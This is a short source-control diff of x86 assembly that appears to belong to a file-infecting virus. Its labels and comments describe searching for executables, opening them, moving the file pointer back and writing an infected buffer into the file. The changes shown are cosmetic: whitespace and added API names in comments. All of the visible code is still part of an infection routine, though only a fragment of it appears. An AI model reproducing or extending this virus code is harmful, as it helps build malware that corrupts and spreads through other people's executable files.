@@ -49,7 +49,7 @@ search_exe_loop:
 	mov		filehandle, eax
 	cmp		filehandle, -1
 	je		open_failed
-	
+
 	push	0
 	push	filehandle
 	call	getfilesize_addr			; GetFileFize()
@@ -96,7 +96,7 @@ infect_dbg:										; DEBUG
 	push	0							; 0 = no high order DWORD for size to move
 	push	0							; size to move
 	push	filehandle
-	call	setfilepointer_addr			; Move back to the beginning of the file
+	call	setfilepointer_addr			; SetFilePointer(). Move back to the beginning of the file
 	cmp		eax, -1
 	je		syserr
 
@@ -108,7 +108,7 @@ infect_dbg:										; DEBUG
 	push	ecx
 	push	fileptr
 	push	filehandle
-	call	writefile_addr				; Write the buffer back to the file.
+	call	writefile_addr				; WriteFile(). Write the buffer back to the file.
 
 	push	filehandle
 	call	closehandle_addr			; We close the file because we are not pigs.
